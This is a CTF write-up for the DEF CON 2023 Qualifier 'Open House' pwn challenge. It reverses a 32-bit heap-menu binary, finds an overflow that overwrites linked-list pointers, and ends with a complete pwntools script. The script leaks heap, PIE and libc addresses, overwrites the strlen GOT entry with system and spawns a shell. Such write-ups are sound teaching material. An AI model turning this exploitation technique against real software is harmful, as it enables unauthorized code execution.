---
title: 'Open House (DEF CON CTF Qualifier 2023)'
categories:
  - Pwnable
tags:
  - Pwn
published: true
date: 2023-05-29
---
# Open House (DEF CON CTF Qualifier 2023)

File challenge: [open-house](https://robbert1978.github.io/assets/uploads/open-house)

## Analyze
![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/bc7228f9-d9c3-425d-893e-a54a35dcfdf6)

32bit ELF with PIE, no RELRO and No canary.

### Reversing

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[16]; // [esp+20h] [ebp-18h] BYREF
  int v5; // [esp+30h] [ebp-8h]

  v5 = 0;
  setvbuf(stdout, 0, 2, 0);
  signal(14, (__sighandler_t)sub_1260);
  alarm(0xB4u);
  fputs("Welcome! Step right in and discover our hidden gem! You'll *love* the pool.\n", stdout);
  add_note(
    "This charming and cozy house exudes a delightful charm that will make you feel right at home. Its warm and inviting "
    "ambiance creates a comforting haven to retreat to after a long day's hard work.");
  add_note(
    "Don't let its unassuming exterior fool you; this house is a hidden gem. With its affordable price tag, it presents a"
    "n excellent opportunity for first-time homebuyers or those seeking a strong investment.");
  add_note(
    "Step into this well-maintained house, and you'll find a tranquil retreat awaiting you. From its tidy interior to the"
    " carefully tended garden, every corner of this home reflects the care and attention bestowed upon it.");
  add_note(
    "Situated in a prime location, this house offers unparalleled convenience. Enjoy easy access to schools, shops, and p"
    "ublic transportation, making everyday tasks a breeze.");
  add_note(
    "Although not extravagant, this house offers a blank canvas for your creativity and personal touch. Imagine the endle"
    "ss possibilities of transforming this cozy abode into your dream home, perfectly tailored to your taste and style.");
  add_note(
    "Discover the subtle surprises that this house holds. From a charming reading nook tucked away by the window to a tra"
    "nquil backyard oasis, this home is full of delightful features that will bring joy to your everyday life.");
  add_note(
    "Embrace a strong sense of community in this neighborhood, where friendly neighbors become extended family. Forge las"
    "ting friendships and create a sense of belonging in this warm and welcoming environment.");
  add_note(
    "With its well-kept condition, this house minimizes the hassle of maintenance, allowing you to spend more time doing "
    "the things you love. Move in with peace of mind, knowing that this home has been diligently cared for.");
  add_note(
    "Whether you're looking to expand your investment portfolio or start your real estate journey, this house presents a "
    "fantastic opportunity. Its affordability and potential for future value appreciation make it a smart choice for savvy buyers.");
  add_note(
    "Escape the hustle and bustle of everyday life and find solace in the tranquility of this home. Its peaceful ambiance"
    " and comfortable layout provide a sanctuary where you can relax, recharge, and create beautiful memories with loved ones.");
  while ( 2 )
  {
    if ( (*(_BYTE *)(&root + 151) & 1) != 0 )
      fputs("c|v|m|d|q> ", stdout);
    else
      fputs("c|v|q> ", stdout);
    if ( fgets(s, 16, stdin) )
    {
      switch ( s[0] )
      {
        case 'c':
          create();
          *((_BYTE *)&root + 604) = 1;
          continue;
        case 'd':
          if ( (*(_BYTE *)(&root + 151) & 1) != 0 )
            delete();
          continue;
        case 'm':
          if ( (*(_BYTE *)(&root + 151) & 1) != 0 )
            replace();
          continue;
        case 'q':
          if ( (*(_BYTE *)(&root + 151) & 1) == 0 )
            fputs("Leaving so soon?\n", stdout);
          break;
        case 'v':
          maybe_view_();
          continue;
        default:
          fputs("Sorry, didn't catch that.\n", stdout);
          continue;
      }
    }
    break;
  }
  fputs("Thanks for stopping by!\n", stdout);
  return 0;
}
```
I edited some functions' name for better viewing code. As you can see, it likely that this a classic  `heap-menu` challenge.

When I tried to reverse the `add_note` function, I saw that maybe this function trys to insert a `node` to a `doubly-linked list`.

```c
char *__cdecl add_note(char *src)
{
  size_t v2; // [esp+14h] [ebp-14h]
  Node *dest; // [esp+20h] [ebp-8h]
  char *desta; // [esp+20h] [ebp-8h]

  for ( dest = (Node *)&head;
        *(_DWORD *)&dest->data[(_DWORD)(&dword_3314 - 3141)];
        dest = *(Node **)&dest->data[(_DWORD)(&dword_3314 - 3141)] )
  {
    ;
  }
  ...
 ```
 I analyzed heap to ensure that my theory was correct.
 
 ```gdb
 pwndbg> set max-visualize-chunk-size 0x40
Set max display size for heap chunks visualization (0 for display all) to 64.
pwndbg> vis 100

0x56559008      0x00000000      0x00000191      ........
0x56559010      0x00000000      0x00000000      ........
0x56559018      0x00000000      0x00000000      ........
0x56559020      0x00000000      0x00000000      ........
..........
0x56559178      0x00000000      0x00000000      ........
0x56559180      0x00000000      0x00000000      ........
0x56559188      0x00000000      0x00000000      ........
0x56559190      0x00000000      0x00000000      ........
0x56559198      0x00000000      0x00000211      ........
0x565591a0      0x73696854      0x61686320      This cha
0x565591a8      0x6e696d72      0x6e612067      rming an
0x565591b0      0x6f632064      0x6820797a      d cozy h
..........
0x56559388      0x00000000      0x00000000      ........
0x56559390      0x00000000      0x00000000      ........
0x56559398      0x00000000      0x00000000      ........
0x565593a0      0x565593b0      0x56558164      ..UVd.UV
0x565593a8      0x00000000      0x00000211      ........
0x565593b0      0x276e6f44      0x656c2074      Don't le
0x565593b8      0x74692074      0x6e752073      t its un
0x565593c0      0x75737361      0x676e696d      assuming
..........
0x56559598      0x00000000      0x00000000      ........
0x565595a0      0x00000000      0x00000000      ........
0x565595a8      0x00000000      0x00000000      ........
0x565595b0      0x565595c0      0x565591a0      ..UV..UV
0x565595b8      0x00000000      0x00000211      ........
0x565595c0      0x70657453      0x746e6920      Step int
0x565595c8      0x6874206f      0x77207369      o this w
0x565595d0      0x2d6c6c65      0x6e69616d      ell-main
..........
0x565597a8      0x00000000      0x00000000      ........
0x565597b0      0x00000000      0x00000000      ........
0x565597b8      0x00000000      0x00000000      ........
0x565597c0      0x565597d0      0x565593b0      ..UV..UV
0x565597c8      0x00000000      0x00000211      ........
0x565597d0      0x75746953      0x64657461      Situated
0x565597d8      0x206e6920      0x72702061       in a pr
0x565597e0      0x20656d69      0x61636f6c      ime loca
..........
0x565599b8      0x00000000      0x00000000      ........
0x565599c0      0x00000000      0x00000000      ........
0x565599c8      0x00000000      0x00000000      ........
0x565599d0      0x565599e0      0x565595c0      ..UV..UV
0x565599d8      0x00000000      0x00000211      ........
0x565599e0      0x68746c41      0x6867756f      Although
0x565599e8      0x746f6e20      0x74786520       not ext
0x565599f0      0x61766172      0x746e6167      ravagant
..........
0x56559bc8      0x00000000      0x00000000      ........
0x56559bd0      0x00000000      0x00000000      ........
0x56559bd8      0x00000000      0x00000000      ........
0x56559be0      0x56559bf0      0x565597d0      ..UV..UV
0x56559be8      0x00000000      0x00000211      ........
0x56559bf0      0x63736944      0x7265766f      Discover
0x56559bf8      0x65687420      0x62757320       the sub
0x56559c00      0x20656c74      0x70727573      tle surp
..........
0x56559dd8      0x00000000      0x00000000      ........
0x56559de0      0x00000000      0x00000000      ........
0x56559de8      0x00000000      0x00000000      ........
0x56559df0      0x56559e00      0x565599e0      ..UV..UV
0x56559df8      0x00000000      0x00000211      ........
0x56559e00      0x72626d45      0x20656361      Embrace 
0x56559e08      0x74732061      0x676e6f72      a strong
0x56559e10      0x6e657320      0x6f206573       sense o
..........
0x56559fe8      0x00000000      0x00000000      ........
0x56559ff0      0x00000000      0x00000000      ........
0x56559ff8      0x00000000      0x00000000      ........
0x5655a000      0x5655a010      0x56559bf0      ..UV..UV
0x5655a008      0x00000000      0x00000211      ........
0x5655a010      0x68746957      0x73746920      With its
0x5655a018      0x6c657720      0x656b2d6c       well-ke
0x5655a020      0x63207470      0x69646e6f      pt condi
..........
0x5655a1f8      0x00000000      0x00000000      ........
0x5655a200      0x00000000      0x00000000      ........
0x5655a208      0x00000000      0x00000000      ........
0x5655a210      0x5655a220      0x56559e00       .UV..UV
0x5655a218      0x00000000      0x00000211      ........
0x5655a220      0x74656857      0x20726568      Whether 
0x5655a228      0x27756f79      0x6c206572      you're l
0x5655a230      0x696b6f6f      0x7420676e      ooking t
..........
0x5655a408      0x00000000      0x00000000      ........
0x5655a410      0x00000000      0x00000000      ........
0x5655a418      0x00000000      0x00000000      ........
0x5655a420      0x5655a430      0x5655a010      0.UV..UV
0x5655a428      0x00000000      0x00000211      ........
0x5655a430      0x61637345      0x74206570      Escape t
0x5655a438      0x68206568      0x6c747375      he hustl
0x5655a440      0x6e612065      0x75622064      e and bu
..........
0x5655a618      0x00000000      0x00000000      ........
0x5655a620      0x00000000      0x00000000      ........
0x5655a628      0x00000000      0x00000000      ........
0x5655a630      0x00000000      0x5655a220      .... .UV
0x5655a638      0x00000000      0x00000411      ........
0x5655a640      0x00000000      0x00000000      ........
0x5655a648      0x00000000      0x00000000      ........
0x5655a650      0x00000000      0x00000000      ........
..........
0x5655aa28      0x00000000      0x00000000      ........
0x5655aa30      0x00000000      0x00000000      ........
0x5655aa38      0x00000000      0x00000000      ........
0x5655aa40      0x00000000      0x00000000      ........
0x5655aa48      0x00000000      0x000205b9      ........         <-- Top chunk
```
As you can see, each `Note` has size of 0x210, there are two pointers in the bottom of it. 

In the `add_note` function, the maxium size to copy from input data to `Node`'s data is 512 ...
```c
...
  *(_DWORD *)&dest->data[(_DWORD)(&dword_3314 - 3141)] = malloc((size_t)&stru_1FC.st_info);
  *(int *)((char *)&dword_3318 + *(_DWORD *)&dest->data[(_DWORD)(&dword_3314 - 3141)] - 12564) = (int)dest;
  desta = *(char **)&dest->data[(_DWORD)(&dword_3314 - 3141)];
  *(_DWORD *)&desta[(_DWORD)(&dword_3314 - 3141)] = 0;
  *(&root + 150) = (Elf32_Dyn *)((char *)*(&root + 150) + 1);
  if ( strlen(src) <= 512 )
    v2 = strlen(src);
  else
    v2 = 512;
  return strncpy(desta, src, v2);
```
...  Now I can easily recover struct of `Node`.
```c
struct Node
{
  char data[512];
  Node *next;
  Node *prev;
};
```
Also beware of that there is a `Node head` in .bss segment
```c
char *__cdecl add_note(char *src)
{
...
  for ( dest = (Node *)&head;
        *(_DWORD *)&dest->data[(_DWORD)(&dword_3314 - 3141)];
        dest = *(Node **)&dest->data[(_DWORD)(&dword_3314 - 3141)] )
 ...
 ```
 ```gdb
0x56559198      0x00000000      0x00000211      ........
0x565591a0      0x73696854      0x61686320      This cha
0x565591a8      0x6e696d72      0x6e612067      rming an
0x565591b0      0x6f632064      0x6820797a      d cozy h
..........
0x56559388      0x00000000      0x00000000      ........
0x56559390      0x00000000      0x00000000      ........
0x56559398      0x00000000      0x00000000      ........
0x565593a0      0x565593b0      0x56558164      ..UVd.UV
0x565593a8      0x00000000      0x00000211      ........
...
pwndbg> vmmap 0x56558164
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     Start        End Perm     Size Offset File
0x56558000 0x56559000 rw-p     1000   3000 /home/robbert/CTF/defcon/open-house +0x1
```
And the `replace` function allows us to read Node.data before overwriting it.
```c
char *replace()
{
    fprintf(stdout, "Replacing this one: %s\n", v5);
    fputs("What do you think we should we replace it with?\n", stdout);
    return fgets(v5->data, 528, stdin);
...
```
### Vuln

`Node`.data's size is 512, but in the `replace` function, you can overwrite 528 bytes -> so you can overwrite `Node`'s next and `Node`'s prev.
```c
char *replace()
{
  char *result; // eax
  Node *v1; // [esp+10h] [ebp-228h]
  int i; // [esp+18h] [ebp-220h]
  unsigned int idx; // [esp+1Ch] [ebp-21Ch]
  char s[528]; // [esp+20h] [ebp-218h] BYREF
  Node *v5; // [esp+230h] [ebp-8h]

  v5 = (Node *)&head;
  fputs("Which of these reviews should we replace?\n", stdout);
  result = fgets(s, 528, stdin);
  if ( result )
  {
    idx = strtoul(s, 0, 10);
    for ( i = 0; i != idx; ++i )
    {
      v1 = v5->next ? v5->next : v5;
      v5 = v1;
      if ( !v1->next )
        break;
    }
    fprintf(stdout, "Replacing this one: %s\n", v5);
    fputs("What do you think we should we replace it with?\n", stdout);
    return fgets(v5->data, 528, stdin);
  }
  return result;
}
```
## Exploit

We can overwrite `next` and `prev` of any `Node`, but we need to leak `heap` or `PIE` first.

```c
char *__cdecl add_note(char *src)
{
  size_t v2; // [esp+14h] [ebp-14h]
  Node *dest; // [esp+20h] [ebp-8h]
  Node *desta; // [esp+20h] [ebp-8h]

  for ( dest = (Node *)&head;
        *(_DWORD *)&dest->data[(_DWORD)(&dword_3314 - 3141)];
        dest = *(Node **)&dest->data[(_DWORD)(&dword_3314 - 3141)] )
  {
    ;
  }
  *(_DWORD *)&dest->data[(_DWORD)(&dword_3314 - 3141)] = malloc((size_t)&stru_1FC.st_info);
  *(int *)((char *)&dword_3318 + *(_DWORD *)&dest->data[(_DWORD)(&dword_3314 - 3141)] - 12564) = (int)dest;
  desta = *(Node **)&dest->data[(_DWORD)(&dword_3314 - 3141)];
  *(_DWORD *)&desta->data[(_DWORD)(&dword_3314 - 3141)] = 0;
  ...
  ```
 So confusing. But when debugging, you can detect that the `for loop` will stop when the current `Node` has `next` is `NULL`.
  
 `next` is right after `data`, so when I try fill up 512 bytes to the "final" `Node`.data"  and then `create` a new `Node`, `the final Node`.next = `new Node` addr
 -> read `the final Node`.data can leak `new Node` addr ( leak heap addr)
 
```py
edit(2,b"2"*512+p32(0)*2)
create(b"BBBBBB") # New heap addr in Node 2

p.sendlineafter(b"c|v|m|d|q> ",b"v")
p.recvuntil(b"2"*512)
leak_heap = u32(p.recv(4))
log.info(f"leak_heap: {hex(leak_heap)}")
```
![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/59d09249-2f12-4641-9999-a9bc73722f0f)

Remember the `Node head` addr is on the heap. Overwritting `Node 2`.next to the heap addr that contains `Node head` addr so I can leak the PIE.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/5cc7af36-7012-4108-bbbe-fee5406cffbb)

```py
target = leak_heap-9408 # Contain PIE addr

edit(2,b"A"*512+p32(target)+p32(0))

leak_pie = edit2leak(3,next = True)
e.address = leak_pie-0x3164
log.info(f"PIE: {hex(e.address)}")
```

When I successfully leaked the PIE address, it's so easy to leak libc's address by overwriting `Node 2`.next to any got address, also this ELF has `no RERLO` so I can overwrite a got to `system`.

I found that the remote server uses libc 2.37.
![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/af0ef274-7fea-4d32-975d-520654536b92)

Final script:
```py
from pwn import *
from time import sleep

context.binary = e = ELF("./open-house")

gs="""
set max-visualize-chunk-size 0x500
# brva 0x00001790
b system
"""
def start():
	global libc
	if args.LOCAL:
		p=e.process()
		libc = e.libc
		if args.GDB:
			gdb.attach(p,gdbscript=gs)
			pause()
	elif args.REMOTE:
		p=remote(args.HOST,int(args.PORT))
		libc = ELF("./libc_2.37")
		p.sendlineafter(b"Ticket please: ",b"ticket{}")
	return p

p = start()
def create(data: bytes):
	p.sendlineafter(b"c|v",b"c")
	p.sendline(data)
def edit(idx: int,data: bytes):
	p.sendlineafter(b"c|v|m|d|q> ",b"m")
	p.sendline(f"{idx}".encode())
	p.sendline(data)
def edit2leak(idx: int,next: bool = False) -> int :
	p.sendlineafter(b"c|v|m|d|q> ",b"m")
	p.sendline(f"{idx}".encode())
	p.recvuntil(b"Replacing this one: ")
	prefix = b""
	if next:
		prefix = p.recv(4)
	leak_addr = u32(p.recv(4))
	suffix =  p.recvuntil(b"\n")
	p.send(prefix+p32(leak_addr)+suffix)
	return leak_addr

create(b"hehehe")

edit(2,b"A"*512+p32(0)*2)

create(b"BBBBBB") # New heap addr in Node 2

p.sendlineafter(b"c|v|m|d|q> ",b"v")
p.recvuntil(b"A"*512)
leak_heap = u32(p.recv(4))
log.info(f"leak_heap: {hex(leak_heap)}")
target = leak_heap-9408 # Contain PIE addr

edit(2,b"A"*512+p32(target)+p32(0))

leak_pie = edit2leak(3,next = True)
e.address = leak_pie-0x3164
log.info(f"PIE: {hex(e.address)}")

edit(2,b"A"*512+p32(e.got.fprintf)+p32(0))

fprintf = edit2leak(3)

edit(2,b"A"*512+p32(e.got.fputs)+p32(0))

fputs =  edit2leak(3)

log.info(f"fprintf: {hex(fprintf)}")
log.info(f"fputs: {hex(fputs)}")

libc.address = fputs - libc.sym.fputs
log.info(f"libc @ {hex(libc.address)}")

edit(2,b"A"*512+p32(e.got.strlen)+p32(0))

edit(3,p32(libc.sym.system))

p.sendline(b"c")
p.sendline(b"/bin/sh")
p.interactive()
```
